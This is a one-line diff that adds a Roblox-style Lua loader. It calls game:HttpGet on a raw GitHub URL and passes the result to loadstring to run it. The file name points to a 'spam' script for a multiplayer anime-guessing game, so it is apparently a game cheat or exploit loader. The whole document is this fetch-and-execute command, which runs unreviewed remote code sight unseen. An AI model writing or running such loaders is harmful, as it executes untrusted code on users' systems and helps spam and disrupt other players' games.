@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/2-player-guess-the-anime-character-spam1-kmqmobcfh02ni1.lua"))()
